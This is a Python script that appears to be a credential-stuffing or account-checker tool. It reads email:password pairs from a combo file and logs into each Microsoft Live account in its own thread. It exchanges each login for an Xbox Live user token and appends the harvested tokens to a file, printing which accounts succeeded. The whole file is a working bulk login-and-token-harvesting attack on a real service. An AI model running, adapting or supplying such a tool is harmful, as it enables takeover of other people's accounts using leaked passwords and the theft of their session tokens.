import requests
import re
import json
import time
import os
import threading
from urllib.parse import urlparse, parse_qs, urlencode, unquote


def authenticate(session, login, pwd):
    try:
        base_url = 'https://login.live.com/oauth20_authorize.srf?'

        qs = unquote(urlencode({
            'client_id': '0000000048093EE3',
            'redirect_uri': 'https://login.live.com/oauth20_desktop.srf',
            'response_type': 'token',
            'display': 'touch',
            'scope': 'service::user.auth.xboxlive.com::MBI_SSL',
            'locale': 'en',
        }))
        resp = session.get(base_url + qs)

        url_re = b'urlPost:\\\'([A-Za-z0-9:\?_\-\.&/=]+)'
        ppft_re = b'sFTTag:\\\'.*value="(.*)"/>'

        login_post_url = re.search(url_re, resp.content).group(1)
        post_data = {
            'login': login,
            'passwd': pwd,
            'PPFT': re.search(ppft_re, resp.content).groups(1)[0],
            'PPSX': 'Passpor',
            'SI': 'Sign in',
            'type': '11',
            'NewUser': '1',
            'LoginOptions': '1',
            'i3': '36728',
            'm1': '768',
            'm2': '1184',
            'm3': '0',
            'i12': '1',
            'i17': '0',
            'i18': '__Login_Host|1',
        }

        resp = session.post(
            login_post_url, data=post_data, allow_redirects=False,
        )

        if 'Location' not in resp.headers:
            # msg = 'Could not log in with supplied credentials'
            # print("Failed: {}")
            pass

        location = resp.headers['Location']
        parsed = urlparse(location)
        fragment = parse_qs(parsed.fragment)
        access_token = fragment['access_token'][0]

        url = 'https://user.auth.xboxlive.com/user/authenticate'
        resp = session.post(url, data=json.dumps({
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT",
            "Properties": {
                "AuthMethod": "RPS",
                "SiteName": "user.auth.xboxlive.com",
                "RpsTicket": access_token,
            }
        }), headers={'Content-Type': 'application/json'})

        json_data = resp.json()
        user_token = json_data['Token']
        
        with open("tokens.txt", "a") as f:
            f.write(f"{user_token}\n")
        print(f"Success: {login}")
    except:
        print(f"Failed: {login}")


logins = open("accs.txt", "r").read().splitlines()
for login in logins:
    try:
        new = login.split(":")
        email = new[0]
        password = new[1]

        try:
            t = threading.Thread(target=authenticate, args=(requests.Session(), email, password))
            t.start()
            #authenticate(requests.Session(), email, password)
            
        except KeyboardInterrupt: 
            exit()
    except:
        pass
